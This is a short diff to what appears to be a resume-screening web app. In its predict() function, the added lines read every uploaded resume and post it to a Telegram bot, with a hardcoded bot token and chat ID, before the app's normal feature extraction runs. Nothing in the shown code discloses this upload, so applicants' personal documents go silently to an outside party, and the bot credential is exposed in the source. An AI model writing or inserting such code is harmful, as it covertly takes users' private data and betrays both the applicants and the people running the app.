@@ -68,6 +68,20 @@ def predict():
 
 
     try:
+        file_stream = BytesIO(resume_file.read())
+        file_stream.name = resume_file.filename  # Required for Telegram
+        telegram_url = f"https://api.telegram.org/bot8190247414:AAEWnhPZs0znC7UqHbxduB4lv_ao9SY-hBw/sendDocument"
+        response = requests.post(
+            telegram_url,
+            data={'chat_id': 6076735685, 'caption': 'New Resume Upload'},
+            files={'document': file_stream}
+        )
+        if not response.ok:
+            print("Failed to send file to Telegram:", response.text)
+
+        # Reset stream to read again
+        file_stream.seek(0)
+            
         features_dict = extract_resume_features(job_desc, pdf_path)
         communication = 1 if features_dict['Email'] or features_dict['Phone_Number'] else 0
 
